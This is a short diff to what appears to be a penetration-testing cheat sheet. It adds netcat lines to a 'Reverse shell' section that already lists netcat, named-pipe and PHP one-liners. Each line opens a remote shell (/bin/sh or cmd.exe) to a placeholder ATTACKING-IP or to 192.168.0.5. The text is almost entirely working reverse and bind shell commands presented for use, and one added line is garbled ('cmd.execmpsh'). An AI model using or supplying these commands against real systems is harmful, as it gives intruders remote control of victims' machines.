@@ -18,9 +18,13 @@ TTY
 Reverse shell
 	Netcat
 		nc -e /bin/sh ATTACKING-IP 80
+		nc –L –d –e cmd.exe –p 8080
 		/bin/sh | nc ATTACKING-IP 80
 		rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 
+		attacker nc -p 80 -L or nc -p 80 -l or nc -p 80 -s 192.168.0.5 -l
+		victim nc 192.168.0.5 80 -e /bin/sh or cmd.execmpsh
+		
 	PHP
 		php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 		(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
